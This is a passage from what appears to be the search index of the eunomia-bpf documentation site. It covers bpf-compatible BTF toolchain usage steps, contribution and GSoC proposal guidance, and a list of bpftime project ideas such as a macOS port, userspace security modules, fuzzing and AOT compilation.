implements the unpacking and loading of the tar archive that <code>btfgen</code> generates. It can load tar archive either embedded into the executable, or provided by an external source. Used together with the <code>btf_helpers.h</code>, it can conveniently modify <code>struct bpf_object_open_opts*</code> and set the <code>custom_btf_path</code>.</li> </ul>"},{"location":"others/bpf-compatible/#usage-manually-use-the-toolchain","title":"Usage - Manually use the toolchain","text":"<p>Usually the <code>prepare</code> steps could only be run once.</p>"},{"location":"others/bpf-compatible/#prepare-btfhub-archive","title":"Prepare - <code>btfhub-archive</code>","text":"<p>You will need a git repo like btfhub-archive, which contains prebuilt btf archive of various releases, archs, and kernels. We also provided a repo for demonstrating only (It contains a little number of kernel btf archives) https://github.com/eunomia-bpf/btfhub-archive.</p> <p>The repo should have the structure like:</p> <pre><code>|- ubuntu &lt;ID in os-release&gt;\n|- ---- 22.04 &lt;VERSION in os-release&gt;\n|- ---- ---- x86_64 &lt;machine in uname&gt;\n|- ---- ---- ---- 5.15.0-71-generic.btf &lt;kernel-release in uname&gt;\n</code></pre> <ul> <li>Note: words in <code>&lt;&gt;</code> are explanation of the folder name.</li> </ul>"},{"location":"others/bpf-compatible/#prepare-build-bpf-compatible-sys","title":"Prepare - build <code>bpf-compatible-sys</code>","text":"<p>Run <code>make</code> in the <code>bpf-compatible-sys</code> folder. It will build <code>libbpf_compatible.a</code> for you, which is a static library used to linked to libbpf programs</p>"},{"location":"others/bpf-compatible/#prepare-use-btfgen-to-fetch-btfhub-archive","title":"Prepare - Use <code>btfgen</code> to fetch <code>btfhub-archive</code>","text":"<p>Run <code>./script/btfgen fetch</code> to download the <code>https://github.com/aquasecurity/btfhub-archive</code> repo to <code>~/.cache/eunomia/btfhub</code>. You can use <code>BTFHUB_REPO_URL</code> to override the repo url, or use <code>BTFHUB_CACHE_DIR</code> to override the local directory.</p>"},{"location":"others/bpf-compatible/#write-your-kernel-program","title":"Write your kernel program","text":"<p>Since generating the btf tar requires the compiled kernel program, so you should provide that first. </p>"},{"location":"others/bpf-compatible/#create-a-btf-tar-archive-with-btfgen","title":"Create a btf tar archive with <code>btfgen</code>","text":"<p>Run <code>./script/btfgen btfgen xxx.o -o min_core_btfs.tar.gz</code> to pack the tailored btf archive into <code>min_core_btfs.tar.gz</code>. <code>xxx.o</code> is the name of the compiled kernel program.</p>"},{"location":"others/bpf-compatible/#create-a-linkable-object-of-the-btf-archive","title":"Create a linkable object of the btf archive","text":"<p>Run <code>ld -r -b binary min_core_btfs.tar.gz -o min_core_btfs_tar.o</code> to generate a linkable <code>min_core_btfs_tar.o</code>. This file declares symbols named <code>_binary_min_core_btfs_tar_gz_start</code> and <code>_binary_min_core_btfs_tar_gz_end</code>, indicating the range of the embed tar.gz file</p>"},{"location":"others/bpf-compatible/#write-the-userspace-program-with-btf_helpersh","title":"Write the userspace program with <code>btf_helpers.h</code>","text":"<p>Call <code>int ensure_core_btf(struct bpf_object_open_opts*)</code> before opening the skeleton.</p> <p>For example:</p> <pre><code>    libbpf_set_print(libbpf_print_fn);\n\n    err = ensure_core_btf(&amp;open_opts);\n    if (err) {\n        fprintf(stderr, \"failed to fetch necessary BTF for CO-RE: %s\\n\", strerror(-err));\n        return 1;\n    }\n\n    obj = execsnoop_bpf__open_opts(&amp;open_opts);\n    if (!obj) {\n        fprintf(stderr, \"failed to open BPF object\\n\");\n        return 1;\n    }\n</code></pre> <p>And call <code>void clean_core_btf(struct bpf_object_open_opts*)</code> before exiting. For example: <pre><code>cleanup:\n    cleanup_core_btf(&amp;open_opts);\n</code></pre></p>"},{"location":"others/bpf-compatible/#link-your-userspace-program-libbpf_compatiblea-and-min_core_btfs_taro-together","title":"Link your userspace program, <code>libbpf_compatible.a</code>, and <code>min_core_btfs_tar.o</code> together","text":"<p>It can be directly done by calling <code>clang &lt;your_program&gt; libbpf_compatible.a min_core_btf.tar.o</code></p>"},{"location":"others/bpf-compatible/#usage-more-simply","title":"Usage - more simply","text":"<p>We have adapted the <code>libbpf-bootstrap</code> to the <code>bpf-compatible</code> toolchain. So there is a more simpler way: - Put your <code>xxx.c</code> (userspace space program) and <code>xxx.bpf.c</code>(kernel program) in the <code>example/c</code> folder, or directly modify an exist one - Add the name (<code>xxx</code> in the last row) to line 27 of <code>example/c/Makefile</code>, e.g <code>APPS = bootstrap execsnoop xxx</code> - Run <code>make xxx</code> in <code>example/cs</code></p> <p>Share on  Share on </p>"},{"location":"others/contribute/","title":"Contributing to eunomia-bpf","text":"<p>The eunomia-bpf team encourages community feedback and contributions. Thank you for your interest in making eunomia-bpd better! There are several ways you can get involved.</p>"},{"location":"others/contribute/#look-at-the-issues-or-help-us-tese","title":"Look at the issues or help us tese","text":"<p>The best way to get started is to look at the issues. We have a number of open issues that are tagged with <code>good first issue</code> or <code>help wanted</code>. If you're interested in working on a fix, leave a comment to let everyone know and to help avoid duplicated effort from others.</p> <p>Don't know where to start? Feel free to ask questions in the issues, in the email list or in the Discord channel, we're happy to help!</p>"},{"location":"others/contribute/#gsocgoogle-summer-of-code-or-osppopen-source-promotion-plan-guidelines","title":"GSOC(Google Summer of Code) or OSPP(Open Source Promotion Plan) Guidelines","text":"<p>Welcome to our Open source events contributor guide! We're excited that you're considering contributing to our project. This guide aims to help you craft a successful proposal that aligns with our organization's goals and expectations.</p>"},{"location":"others/contribute/#writing-a-successful-gsoc-proposal","title":"Writing a Successful GSoC Proposal","text":"<p>Your proposal is your opportunity to make a strong case for your project idea. All proposals should be submitted through the GSoC website, and the key ideas and designs should be put in the issues from the idea lists</p> <p>Here\u2019s how you can structure it and what it may include:</p>"},{"location":"others/contribute/#introduction","title":"Introduction","text":"<ul> <li>Background: Introduce yourself. Include your academic background, relevant experience, and any previous open-source contributions.</li> <li>Motivation: Explain why you are interested in this project and what makes you a suitable candidate.</li> </ul>"},{"location":"others/contribute/#project-description","title":"Project Description","text":"<ul> <li>Overview: Offer a detailed description of your project, including the problem it addresses and its objectives.</li> <li>Technical Details: Discuss the technologies, tools, and methodologies you plan to use.</li> <li>Innovation: Highlight any unique approaches or solutions you intend to implement.</li> </ul>"},{"location":"others/contribute/#timeline","title":"Timeline","text":"<ul> <li>Schedule: Outline a week-by-week plan. Include milestones, specific tasks, and deadlines.</li> <li>Flexibility: Show that you\u2019ve considered potential setbacks and have a plan to accommodate them.</li> </ul>"},{"location":"others/contribute/#contribution-and-impact","title":"Contribution and Impact","text":"<ul> <li>Open Source Contribution: Explain how your project will benefit the open-source community.</li> <li>Future Work: Discuss how your project can be expanded or improved upon in the future.</li> </ul>"},{"location":"others/contribute/#appendices","title":"Appendices","text":"<ul> <li>Code Samples/Portfolio: Include links to any relevant past work, GitHub repositories, or code samples.</li> <li>References: List any references or resources that support your proposal.</li> </ul>"},{"location":"others/contribute/#additional-tips","title":"Additional Tips","text":"<ul> <li>Clarity and Conciseness: Write clearly and concisely. Avoid jargon and explain technical terms.</li> <li>Proofreading: Ensure your proposal is free from grammatical errors and typos.</li> <li>Feedback: Seek feedback on your draft from peers, mentors, or community members before submission.</li> </ul>"},{"location":"others/contribute/#getting-in-touch","title":"Getting in Touch","text":"<p>Once you are interested in a project, you can get in touch as soon as possible. You can ask questions about the project, the community, and the application process. You can also discuss your ideas and get feedback from the community. It's recommended to do everything in public, such as in the issues or the Discussions on Github.</p> <ul> <li>Communication Channels: Use our official GSoC communication channels, in the email list or in the Discord channel. You can also ask with the GitHub discussions.</li> <li>Mentor Interaction: Engage with potential mentors early. Discuss your ideas and incorporate their feedback into your proposal.</li> <li>Community Engagement: Participate in community forums or meetings to better understand our project and culture.</li> </ul>"},{"location":"others/contribute/#open-internship-in-plct-lab","title":"Open Internship in PLCT Lab","text":"<p>There maybe some open internship positions sponsored by PLCT Lab.</p> <p>See https://github.com/plctlab/weloveinterns/blob/master/open-internships.md</p> <p>Share on  Share on </p>"},{"location":"others/ebpf-gpts/","title":"An experiment: GPTs for eBPF","text":"<p>An experiment: GPTs for eBPF</p> <p></p> <p>https://chat.openai.com/g/g-h1WOms1QT-ebpf-expert</p> <p>Share on  Share on </p>"},{"location":"others/ideas/","title":"Possible ideas for the future","text":"<p>This is some possible ideas for open source events, like GSOC(Google Summer of Code) or OSPP(Open Source Promotion Plan) and others. Our projects are designed to suit contributors with varying levels of expertise, from students to more advanced developers.</p> <p>It's also part of our project roadmap, if you don't participate in these events, you can also help or colaborate with these ideas! Need help? Please contact in the email list or in the Discord channel.</p>"},{"location":"others/ideas/#table-of-contents","title":"Table of contents","text":"<ul> <li>Possible ideas for the future</li> <li>Table of contents</li> <li>Porting bpftime to macOS and other platforms<ul> <li>Objectives for enable eBPF on macOS</li> <li>Expected Outcomes</li> <li>Prerequisites and Skills</li> <li>Reference and issue</li> </ul> </li> <li>VirtIO devices memory address translation fastpath<ul> <li>Project Overview</li> <li>Objectives</li> <li>Expected Outcomes</li> <li>Prerequisites and Skills</li> <li>Reference and Issue</li> </ul> </li> <li>User-Space eBPF Security Modules for Comprehensive Security Policies<ul> <li>Project Overview</li> <li>Objectives</li> <li>Expected Outcomes</li> <li>Prerequisites and Skills</li> <li>Reference and Issue</li> </ul> </li> <li>Add Fuzzer and kernel eBPF test for bpftime to improve compatibility<ul> <li>Project Overview</li> <li>Timeframe and Difficulty</li> <li>Mentors</li> <li>Objectives</li> <li>Expected Outcomes</li> <li>Prerequisites and Skills</li> <li>Reference and Issue</li> </ul> </li> <li>Living patching distributed RocksDB with shared IO and Network Interface over io_uring<ul> <li>Project Overview</li> <li>Objectives</li> <li>Expected Outcomes</li> <li>Prerequisites and Skills</li> <li>Reference and Issue</li> </ul> </li> <li>Userspace AOT Compilation of eBPF for Lightweight Containers<ul> <li>Overview</li> <li>Goals and Objectives</li> <li>Prerequisites and Skills Required</li> <li>Expected Outcomes</li> <li>Additional Resources</li> </ul> </li> <li>Userspace eBPF for Userspace File System<ul> <li>Objectives</li> <li>Expected Outcomes</li> <li>Prerequisites and Skills</li> <li>Resources</li> </ul> </li> <li>BPFTime Profiling and Machine Learning Prediction for far memory or distributed shared memory management<ul> <li>Project Overview</li> <li>Objectives</li> <li>Expected Outcomes</li> <li>Prerequisites and Skills</li> <li>Reference and Issue</li> </ul> </li> <li>Large Language Model specific metrics observability in BPFTime<ul> <li>Project Overview</li> <li>Objectives</li> <li>Expected Outcomes</li> <li>Prerequisites and Skills</li> <li>Reference and Issue</li> </ul> </li> <li>Porting bpftime to Windows, FreeBSD, or other platforms</li> </ul> <p>For more details, see:</p> <ul> <li>https://eunomia.dev/bpftime</li> <li>https://github.com/eunomia-bpf/bpftime</li> </ul>"},{"location":"others/ideas/#porting-bpftime-to-macos-and-other-platforms","title":"Porting bpftime to macOS and other platforms","text":"<p>Since bpftime can run in userspace and does not require kernel eBPF, why not enable eBPF on MacOS/FreeBSD/Other Platforms?</p> <p>The goal of this project is to port <code>bpftime</code> to macOS and other platforms, expanding its cross-platform capabilities and enabling macOS users to leverage the powerful features of <code>eBPF</code> in their development and production environments. With bpftime, now you may be able to run bcc and bpftrace tools on macOS and other OSs!</p> <ul> <li>time: ~175 hour</li> <li>Difficulty Level: medium</li> <li>mentor: Tong Yu (yt.xyxx@gmail.com) and Yuxi Huang (Yuxi4096@gmail.com)</li> </ul>"},{"location":"others/ideas/#objectives-for-enable-ebpf-on-macos","title":"Objectives for enable eBPF on macOS","text":"<ol> <li>Compatibility and Integration: Achieve compatibility of <code>bpftime</code> with macOS and/or other OSs, ensuring that core features and capabilities are functional on this platform.</li> <li>Performance Optimization: Fine-tune the performance of <code>bpftime</code> on macOS and/or other OSs, focusing on optimizing the LLVM JIT and the lightweight JIT for x86 specifically for macOS architecture.</li> <li>Seamless Integration with macOS Ecosystem: Ensure that <code>bpftime</code> integrates smoothly with macOS and/or other OSs environments, providing a native and efficient development experience for eBPF users.</li> <li>Documentation and Tutorials: Develop documentation and tutorials tailored to macOS users, facilitating easy adoption and use of <code>bpftime</code> on this platform.</li> </ol>"},{"location":"others/ideas/#expected-outcomes","title":"Expected Outcomes","text":"<ul> <li>A functional port of <code>bpftime</code> for macOS and/or other OSs, with core features operational.</li> <li>You should be able to run <code>bpftrace</code> and <code>bcc</code> tools on them, and get expected output.</li> <li>documentation and guides for using <code>bpftime</code> on macOS and/or other OSs.</li> </ul>"},{"location":"others/ideas/#prerequisites-and-skills","title":"Prerequisites and Skills","text":"<ul> <li>Proficiency in C/C++ and system programming.</li> <li>Familiarity with macOS development environment and tools.</li> <li>Understanding of eBPF and its applications.</li> </ul>"},{"location":"others/ideas/#reference-and-issue","title":"Reference and issue","text":"<ul> <li>Issue and some initial discussion: https://github.com/eunomia-bpf/bpftime/issues</li> <li>Some previous efforts: Enable bpftime on arm</li> </ul>"},{"location":"others/ideas/#virtio-devices-memory-address-translation-fastpath","title":"VirtIO devices memory address translation fastpath","text":"<p>The triple address translation from physical VirtIO to the userspace memory is a performance bottleneck. It requires the DPA to HPA to physical memory translation. The VirtIO devices memory address translation fastpath project aims to develop a fastpath for VirtIO devices memory address translation, reducing the overhead of the triple address translation and improving the performance of VirtIO devices. Also, the side channel attack increases the threats for core isolation for the Cloud Vendors. Leveraging BPFTime to design a safe fastpath primitive message passing for dedicated application access to VirtIO devices memory address translation enables safe, efficient and low-latency memory access for VirtIO devices.</p>"},{"location":"others/ideas/#project-overview","title":"Project Overview","text":"<ul> <li>Time Cost: ~350 hours</li> <li>Difficulty Level: Hard</li> <li>Mentors: Yiwei Yang (yyang363@ucsc.edu) Yusheng Zheng (yunwei356@gmail.com)</li> </ul>"},{"location":"others/ideas/#objectives","title":"Objectives","text":"<ul> <li>Develop a fastpath for VirtIO devices memory address translation, reducing the overhead of the triple address translation and improving the performance of VirtIO devices.</li> <li>Design a safe fastpath primitive message passing for dedicated application access to VirtIO devices memory address translation.</li> </ul>"},{"location":"others/ideas/#expected-outcomes_1","title":"Expected Outcomes","text":"<ul> <li>A fastpath for VirtIO devices memory address translation, reducing the overhead of the triple address translation and improving the performance of VirtIO devices.</li> <li>A safe fastpath primitive message passing for dedicated application access to VirtIO devices memory address translation.</li> </ul>"},{"location":"others/ideas/#prerequisites-and-skills_1","title":"Prerequisites and Skills","text":"<ul> <li>Proficiency in C/C++ and system programming.</li> <li>Understanding of VirtIO devices, micro kernel and memory address translation.</li> <li>Familiarity with user-space and kernel-space programming paradigms.</li> <li>Experience with developing and testing eBPF programs is highly advantageous.</li> </ul>"},{"location":"others/ideas/#reference-and-issue_1","title":"Reference and Issue","text":"<ul> <li>Recent paper about offloading userspace program to kernel NVMe device XRP</li> <li>Paper about the fastpath and offloading for DPU DPFS, M3</li> <li>Youtube video about the fastpath for VirtIO VirtIO</li> </ul>"},{"location":"others/ideas/#user-space-ebpf-security-modules-for-comprehensive-security-policies","title":"User-Space eBPF Security Modules for Comprehensive Security Policies","text":""},{"location":"others/ideas/#project-overview_1","title":"Project Overview","text":"<p>bpftime is a user-space eBPF runtime that allows existing eBPF applications to run directly in unprivileged user space, using the same libraries and toolchains, and to obtain trace analysis results. It provides tracing points such as Uprobe and Syscall tracepoint for eBPF, reducing the overhead by about 10 times compared to kernel uprobe, without the need for manual code instrumentation or process restarts. It enables non-intrusive analysis of source code and compilation processes. It can also be combined with DPDK to implement XDP functionality in user-space networking, compatible with kernel XDP. The runtime supports inter-process eBPF maps in user-space shared memory, as well as kernel eBPF maps, allowing seamless operation with the kernel's eBPF infrastructure. It also includes high-performance eBPF LLVM JIT/AOT compilers for multiple architectures.</p> <p>Linux Security Modules (LSM) is a security framework implemented in the Linux kernel, providing a mechanism for various security policy modules to be inserted into the kernel, enhancing the system's security. LSM is designed to offer an abstraction layer for the Linux operating system to support multiple security policies without changing the core code of the kernel. This design allows system administrators or distributions to choose a security model that fits their security needs, such as SELinux, AppArmor, Smack, etc.</p> <p>What can LSM be used for?</p> <ul> <li>Access Control: LSM is most commonly used to implement Mandatory Access Control (MAC) policies, different from the traditional owner-based Access Control (DAC). MAC can control access to resources like files, network ports, and inter-process communication in a fine-grained manner.</li> <li>Logging and Auditing: LSM can be used to log and audit sensitive operations on the system, providing detailed log information to help detect and prevent potential security threats.</li> <li>Sandboxing and Isolation: By limiting the behavior of programs and the resources they can access, LSM can sandbox applications, reducing the risk of malware or vulnerability exploitation.</li> <li>Enhancing Kernel and User-Space Security: LSM allows for additional security checks and restrictions to enhance the security of both the kernel itself and applications running in user-space.</li> <li>Limiting Privileged Operations: LSM can limit the operations that even processes with root privileges can perform, reducing the potential harm from misconfigurations by system administrators or malicious software with root access.</li> </ul> <p>With bpftime, we can run eBPF programs in user space, compatible with the kernel, and collaborate with the kernel's eBPF to implement defense. Is it possible to further extend eBPF's security mechanisms and features to user space, allowing user-space eBPF and kernel-space eBPF to work together to implement more powerful and flexible security policies and defense capabilities? Let's call this mechanism USM (Userspace Security Modules or Union Security Modules).</p> <p>You can explore more possibilities with us:</p> <ul> <li>Time Cost: ~350 hours</li> <li>Difficulty Level: Hard</li> <li>Mentors: Yiwei Yang (yyang363@ucsc.edu) Yusheng Zheng (yunwei356@gmail.com)</li> </ul>"},{"location":"others/ideas/#objectives_1","title":"Objectives","text":"<ol> <li>USM Framework Design and Implementation: Architect and implement the USM framework within bpftime, enabling user-space eBPF programs to work alongside kernel-space eBPF LSM programs.</li> <li>Security Scenario Exploration: Investigate potential security scenarios where USM can effectively intercept and defend against security threats, using both kernel and user-space eBPF mechanisms.</li> <li>Continuous Integration and Testing: Integrate USM testing into the bpftime CI pipeline, conducting regular checks to ensure compatibility and effectiveness of security policies.</li> <li>Documentation and Community Feedback: Generate comprehensive documentation on USM's architecture, API, and implementation. Engage with the bpftime community to gather feedback and refine USM.</li> <li>Security Policy Development and Validation: Develop and validate security policies that leverage USM, demonstrating its potential in enhancing system security.</li> </ol>"},{"location":"others/ideas/#expected-outcomes_2","title":"Expected Outcomes","text":"<ul> <li>A fully implemented USM framework within the bpftime environment, allowing for seamless operation with kernel-space eBPF LSM programs and compatible with kernel eBPF toolchains and libraries.</li> <li>Integration of USM testing into the bpftime CI pipeline to ensure ongoing compatibility and security efficacy.</li> <li>A set of validated security policies showcasing USM's capability to enhance both kernel and user-space security.</li> <li>Comprehensive documentation and a feedback loop with the community for continuous improvement of USM.</li> </ul>"},{"location":"others/ideas/#prerequisites-and-skills_2","title":"Prerequisites and Skills","text":"<ul> <li>Proficiency in C/C++ and system programming.</li> <li>Understanding of security mechanisms and policies, especially related to Linux Security Modules (LSM) and eBPF.</li> <li>Familiarity with user-space and kernel-space programming paradigms.</li> <li>Experience with developing and testing eBPF programs is highly advantageous.</li> </ul>"},{"location":"others/ideas/#reference-and-issue_2","title":"Reference and Issue","text":"<ul> <li>Conceptual foundation for USM in bpftime: GitHub Discussion</li> <li>Initial exploration of eBPF security mechanisms: https://docs.kernel.org/bpf/prog_lsm.html, and kernel Runtime Verification https://docs.kernel.org/trace/rv/runtime-verification.html#runtime-monitors-and-reactors</li> <li>Engaging with existing eBPF and LSM communities for insights and collaboration opportunities.</li> </ul>"},{"location":"others/ideas/#add-fuzzer-and-kernel-ebpf-test-for-bpftime-to-improve-compatibility","title":"Add Fuzzer and kernel eBPF test for bpftime to improve compatibility","text":""},{"location":"others/ideas/#project-overview_2","title":"Project Overview","text":"<p>The <code>bpftime</code> project, known for its innovative userspace eBPF runtime, is seeking to enhance its robustness and reliability by integrating a fuzzer. This project aims to develop or integrate a fuzzer for <code>bpftime</code>, using tools like Google's Buzzer or <code>syzkaller</code>. The fuzzer will systematically test <code>bpftime</code> to uncover any potential bugs, memory leaks, or vulnerabilities, ensuring a more secure and stable runtime environment. Besides, we also need to add kernel eBPF test for bpftime to improve compatibility.</p> <p>You also needs to enable the fuzzer and eBPF tests in CI.</p>"},{"location":"others/ideas/#timeframe-and-difficulty","title":"Timeframe and Difficulty","text":"<ul> <li>Time Commitment: ~90 hours</li> <li>Difficulty Level: Easy</li> </ul>"},{"location":"others/ideas/#mentors","title":"Mentors","text":"<ul> <li>Tong Yu (yt.xyxx@gmail.com)</li> <li>Yusheng Zheng (yunwei356@gmail.com)</li> </ul>"},{"location":"others/ideas/#objectives_2","title":"Objectives","text":"<ol> <li>Fuzzer Development and Integration: Design or develop a fuzzer that can be seamlessly integrated with <code>bpftime</code>. Or you can use existing fuzzers for eBPF.</li> <li>Testing and Debugging: Use the fuzzer to identify and report bugs, memory leaks, or vulnerabilities in <code>bpftime</code> userspace eBPF runtime.</li> <li>Continuous Integration: Integrate the fuzzer and kernel eBPF test into the <code>bpftime</code> CI pipeline, ensuring that it is run regularly to identify and resolve any issues.</li> <li>Documentation: Create documentation detailing the fuzzer\u2019s implementation or usage within the <code>bpftime</code> environment.</li> <li>Feedback Implementation: Actively incorporate feedback from the <code>bpftime</code> community to refine and enhance the fuzzer.</li> </ol>"},{"location":"others/ideas/#expected-outcomes_3","title":"Expected Outcomes","text":"<ul> <li>A fully integrated fuzzer within the <code>bpftime</code> environment.</li> <li>An integration of the fuzzer and kernel eBPF test into the <code>bpftime</code> CI pipeline.</li> <li>An increase in the identified and resolved bugs and vulnerabilities in <code>bpftime</code>.</li> <li>Documentation and guidelines for future contributors to utilize and improve the fuzzer.</li> </ul>"},{"location":"others/ideas/#prerequisites-and-skills_3","title":"Prerequisites and Skills","text":"<ul> <li>Skills in C/C++ and system programming.</li> <li>Familiarity with software testing methodologies, particularly fuzz testing.</li> <li>Experience with fuzzers like Google's Buzzer is highly beneficial.</li> <li>Basic knowledge of eBPF and its ecosystem.</li> </ul>"},{"location":"others/ideas/#reference-and-issue_3","title":"Reference and Issue","text":"<ul> <li>Initial discussion on the need for a fuzzer in <code>bpftime</code>: GitHub Issue</li> <li>Google buzzer: https://github.com/google/buzzer</li> <li>[FEATURE] Test with kernel eBPF test: https://github.com/eunomia-bpf/bpftime/issues/210</li> </ul>"},{"location":"others/ideas/#living-patching-distributed-rocksdb-with-shared-io-and-network-interface-over-io_uring","title":"Living patching distributed RocksDB with shared IO and Network Interface over io_uring","text":"<p>RocksDB is a high-performance, embedded key-value store for fast storage. It is widely used in distributed systems, such as databases, storage systems, and other applications. However, the performance of RocksDB is highly dependent on the underlying storage and network interfaces. The performance of RocksDB can be further improved by using shared IO and network interfaces over io_uring. This project aims to develop a living patching mechanism for distributed RocksDB with shared IO and network interfaces over io_uring, enabling dynamic and efficient performance optimization. This project will empower RocksDB with remote I/O and network interfaces, allowing it to leverage the performance benefits of io_uring and shared interfaces.</p>"},{"location":"others/ideas/#project-overview_3","title":"Project Overview","text":"<ul> <li>Time Cost: ~350 hours</li> <li>Difficulty Level: Hard</li> <li>Mentors: Yiwei Yang (yyang363@ucsc.edu) and Yusheng Zheng (yunwei356@gmail.com)</li> </ul>"},{"location":"others/ideas/#objectives_3","title":"Objectives","text":"<ul> <li>Develop a living patching mechanism for distributed RocksDB with shared IO and network interfaces over io_uring.</li> <li>Implement a dynamic performance optimization system for distributed RocksDB, leveraging the performance benefits of io_uring MMAP interface.</li> </ul>"},{"location":"others/ideas/#expected-outcomes_4","title":"Expected Outcomes","text":"<ul> <li>A living patching mechanism for distributed RocksDB with shared IO and network interfaces over io_uring.</li> <li>A dynamic performance optimization system for distributed RocksDB, leveraging the performance benefits of io_uring MMAP interface.</li> </ul>"},{"location":"others/ideas/#prerequisites-and-skills_4","title":"Prerequisites and Skills","text":"<ul> <li>Proficiency in C/C++ and system programming.</li> <li>Understanding of RocksDB and io_uring implementation.</li> <li>Familiarity with user-space and kernel-space programming paradigms.</li> <li>Experience with developing and testing eBPF programs is highly advantageous.</li> </ul>"},{"location":"others/ideas/#reference-and-issue_4","title":"Reference and Issue","text":"<ul> <li>Recent paper about BPF function offloading to remote BPF oF</li> <li>eBPF meets io_uring io_uring</li> </ul>"},{"location":"others/ideas/#userspace-aot-compilation-of-ebpf-for-lightweight-containers","title":"Userspace AOT Compilation of eBPF for Lightweight Containers","text":""},{"location":"others/ideas/#overview","title":"Overview","text":"<p>In the evolving world of cloud-native applications, IoT, and embedded systems, there's an increasing demand for efficient, secure, and resource-conscious computing solutions. Our project addresses these needs by focusing on the development of a userspace eBPF (Extended Berkeley Packet Filter) with Ahead-of-Time (AOT) compilation. This initiative aims to create a lightweight, event-driven computing model that caters to the unique demands of embedded and resource-constrained environments.</p> <p>The main difference eBPF AOT can bring is that it can help build a verifiable and secure runtime for applications, and it can be lightweight and efficient enough, with a low startup time to run on embedded devices.</p> <p>Duration and Difficulty Level</p> <ul> <li>Estimated Time: ~175 hours</li> <li>Difficulty Level: Medium</li> <li>Mentors: Tong Yu (yt.xyxx@gmail.com) Yusheng Zheng (yunwei356@gmail.com)</li> </ul> <p>bpftime already have a AOT compiler, we need more work to enable it run on embedded devices or as plugins. If you want to add map support for microcontrollers with AOT compiler, maybe you can write a c implementation, compile it and link it with bpftime AOT products.</p>"},{"location":"others/ideas/#goals-and-objectives","title":"Goals and Objectives","text":"<ol> <li>Develop Userspace eBPF AOT Compilation: The AOT compiler should be able to work well with helpers, ufuncs maps and other features of eBPF. Currently there is a POC for AOT compiler, but it's not complete and need more work.</li> </ol> <p>You can choose one or two of these goals to work on:</p> <ol> <li>Integration into FaaS Containers: Seamlessly integrate this technology into Function-as-a-Service (FaaS) lightweight containers, enhancing startup speed and operational efficiency.</li> <li>Plugin System Implementation: Design a system allowing eBPF programs to be embedded as plugins in other applications, offering dynamic, optimized functionality.</li> <li>Run AOT eBPF on embedded devices: Enable AOT eBPF to run on embedded devices, such as Raspberry Pi, and other IoT devices.</li> </ol>"},{"location":"others/ideas/#prerequisites-and-skills-required","title":"Prerequisites and Skills Required","text":"<ul> <li>Skills in C/C++ and system-level programming.</li> <li>Basic understanding of container technologies and FaaS architectures.</li> <li>Familiarity with eBPF concepts and applications.</li> <li>Interest in IoT, cloud-native, and embedded systems.</li> </ul>"},{"location":"others/ideas/#expected-outcomes_5","title":"Expected Outcomes","text":"<ul> <li>A functional userspace eBPF runtime with AOT compilation capabilities.</li> <li>Demonstrated integration in FaaS lightweight containers.</li> <li>A plugin system enabling the embedding of eBPF programs in various applications.</li> <li>Run AOT eBPF on embedded devices.</li> </ul>"},{"location":"others/ideas/#additional-resources","title":"Additional Resources","text":"<ol> <li>The AOT example of bpftime https://github.com/eunomia-bpf/bpftime/blob/master/.github/workflows/test-aot-cli.yml</li> <li>The API for vm. https://github.com/eunomia-bpf/bpftime/tree/master/vm/include</li> <li>Compile it as a standalone lib https://github.com/eunomia-bpf/bpftime/tree/master/vm/llvm-jit</li> <li>Femto-containers: lightweight virtualization and fault isolation for small software functions on low-power IoT microcontrollers https://dl.acm.org/doi/abs/10.1145/3528535.3565242</li> </ol> <p>If you want to add map support for microcontrollers,  I think you can write a c implementation, compile it and link it with bpftime AOT products. We will provide an example later.</p>"},{"location":"others/ideas/#userspace-ebpf-for-userspace-file-system","title":"Userspace eBPF for Userspace File System","text":"<p>In modern operating systems, <code>fuse</code> (Filesystem in Userspace) has become a popular choice, allowing developers to create file systems in user space without modifying kernel code. However, the cost of system calls still exists. This is where <code>bpftime</code> can play a role.</p> <p>bpftime may help:</p> <ul> <li>reducing the overhead of system calls and enhancing performance</li> <li>enable cache for fuse without modifying the kernel</li> <li>dynamic adjustment of file system strategies based on performance data</li> <li>Add more policy and strategy for fuse</li> </ul> <p>You can explore more possibilities with us:</p> <ul> <li>Time Cost: ~350 hours</li> <li>Difficulty Level: Hard</li> <li>Mentors: Yiwei Yang (yyang363@ucsc.edu) Yusheng Zheng (yunwei356@gmail.com)</li> </ul>"},{"location":"others/ideas/#objectives_4","title":"Objectives","text":"<ol> <li>Synergistic Optimization Between User and Kernel Space: Utilize <code>bpftime</code> to pre-process file system operations like caching and metadata queries in user space, thereby minimizing system call overhead.</li> <li>Kernel Bypass Mechanism in User Space: Develop a kernel bypass mechanism for file systems in user space using eBPF, potentially eliminating the need for invasive changes to user applications.</li> <li>Dynamic Strategy Adjustment: Implement a system within <code>bpftime</code> to dynamically collect performance data and adjust operational strategies in real-time.</li> <li>Customization for Specific Workloads: Enable developers to tailor eBPF programs for diverse application scenarios, optimizing for various workloads.</li> </ol>"},{"location":"others/ideas/#expected-outcomes_6","title":"Expected Outcomes","text":"<ul> <li>A proof-of-concept implementation demonstrating the synergy between <code>bpftime</code> and userspace file systems.</li> <li>A reduction in system call overhead for file operations in user space.</li> <li>A framework allowing dynamic adjustment of file system strategies based on performance data.</li> <li>Documentation or papers</li> </ul>"},{"location":"others/ideas/#prerequisites-and-skills_5","title":"Prerequisites and Skills","text":"<ul> <li>Proficiency in C/C++ and system-level programming.</li> <li>Familiarity with file system concepts and user space-kernel space interactions.</li> <li>Basic understanding of eBPF and its applications in modern operating systems.</li> <li>Experience with <code>fuse</code> or similar technologies is a plus.</li> </ul>"},{"location":"others/ideas/#resources","title":"Resources","text":"<ul> <li>Extfuse paper and GitHub repo: https://github.com/extfuse/extfuse</li> <li>https://lwn.net/Articles/915717/</li> </ul>"},{"location":"others/ideas/#bpftime-profiling-and-machine-learning-prediction-for-far-memory-or-distributed-shared-memory-management","title":"BPFTime Profiling and Machine Learning Prediction for far memory or distributed shared memory management","text":"<p>The upcoming world for CXL.mem provides a new way of memory fabric, it can seemingly share the memory between different nodes adding another layer between NUMA Remote, and SSDs. It can either be far memory node for disaggregation or distributed shared memory shared or pooled across nodes. However, issuing load and store to the CXL pool is easily throttle the performance. BPFTime can provide an extra layer of metrics collection and prediction for profiling guided memory management. BPFTime provides a cross kernel space and userspace boundary observability online. We think the offline access to the far memory is not deterministic across different workloads, and the same workloads with different runs, and the machine learning model can provide a better prediction for the memory access pattern.</p>"},{"location":"others/ideas/#project-overview_4","title":"Project Overview","text":"<ul> <li>Time Cost: ~350 hours</li> <li>Difficulty Level: Hard</li> <li>Mentors: Yiwei Yang (yyang363@ucsc.edu) Yusheng Zheng 